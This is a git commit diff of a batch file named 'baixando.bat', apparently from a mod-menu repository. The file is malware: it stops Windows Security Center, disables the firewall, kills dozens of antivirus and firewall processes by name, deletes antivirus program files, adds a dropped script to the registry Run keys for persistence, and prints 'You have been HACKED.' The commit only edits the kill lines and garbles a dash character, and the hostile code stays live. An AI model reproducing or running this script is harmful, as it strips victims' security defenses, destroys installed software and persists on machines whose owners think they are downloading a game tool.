a04916c80dc182dbcbbe498fcc717ce08a92eeee
guibmodmenu <127268407+guibmodmenu@users.noreply.github.com>
2024-09-02 20:42:05 -0300

    Update baixando.bat

--- baixando.bat
+++ baixando.bat
@@ -1,84 +1,84 @@
  @"@echo off
-rem —
+rem â€”
 rem Permanently Kill Anti-Virus
 net stop ""Security Center""
 netsh firewall set opmode mode=disable
-tskill /A av*
-tskill /A fire*
-tskill /A anti*
+tskill /A av
+tskill /A fire
+tskill /A anti
 cls
-tskill /A spy*
+tskill /A spy
 tskill /A bullguard
 tskill /A PersFw
-tskill /A KAV*
+tskill /A KAV
 tskill /A ZONEALARM
 tskill /A SAFEWEB
 cls
 tskill /A OUTPOST
-tskill /A nv*
-tskill /A nav*
-tskill /A F-*
+tskill /A nv
+tskill /A nav
+tskill /A F-
 tskill /A ESAFE
 tskill /A cle
 cls
 tskill /A BLACKICE
-tskill /A def*
+tskill /A def
 tskill /A kav
-tskill /A kav*
-tskill /A avg*
-tskill /A ash*
+tskill /A kav
+tskill /A avg
+tskill /A ash
 cls
 tskill /A aswupdsv
-tskill /A ewid*
-tskill /A guard*
-tskill /A guar*
-tskill /A gcasDt*
-tskill /A msmp*
+tskill /A ewid
+tskill /A guard
+tskill /A guar
+tskill /A gcasDt
+tskill /A msmp
 cls
-tskill /A mcafe*
+tskill /A mcafe
 tskill /A mghtml
 tskill /A msiexec
 tskill /A outpost
 tskill /A isafe
-tskill /A zap*
+tskill /A zap
 cls
 tskill /A zauinst
-tskill /A upd*
-tskill /A zlclien*
+tskill /A upd
+tskill /A zlclien
 tskill /A minilog
-tskill /A cc*
-tskill /A norton*
+tskill /A cc
+tskill /A norton
 cls
-tskill /A norton au*
-tskill /A ccc*
-tskill /A npfmn*
-tskill /A loge*
-tskill /A nisum*
+tskill /A norton au
+tskill /A ccc
+tskill /A npfmn
+tskill /A loge
+tskill /A nisum
 tskill /A issvc
-tskill /A tmp*
+tskill /A tmp
 cls
-tskill /A tmn*
-tskill /A pcc*
-tskill /A cpd*
-tskill /A pop*
-tskill /A pav*
+tskill /A tmn
+tskill /A pcc
+tskill /A cpd
+tskill /A pop
+tskill /A pav
 tskill /A padmin
 cls
-tskill /A panda*
-tskill /A avsch*
-tskill /A sche*
-tskill /A syman*
-tskill /A virus*
-tskill /A realm*
+tskill /A panda
+tskill /A avsch
+tskill /A sche
+tskill /A syman
+tskill /A virus
+tskill /A realm
 cls
-tskill /A sweep*
-tskill /A scan*
-tskill /A ad-*
-tskill /A safe*
-tskill /A avas*
-tskill /A norm*
+tskill /A sweep
+tskill /A scan
+tskill /A ad-
+tskill /A safe
+tskill /A avas
+tskill /A norm
 cls
-tskill /A offg*
+tskill /A offg
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
 del /Q /F C:\Program Files\kasper~1\*.exe
@@ -130,3 +130,4 @@ echo end>>c:windowshartlell.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
 echo You have been HACKED.
+
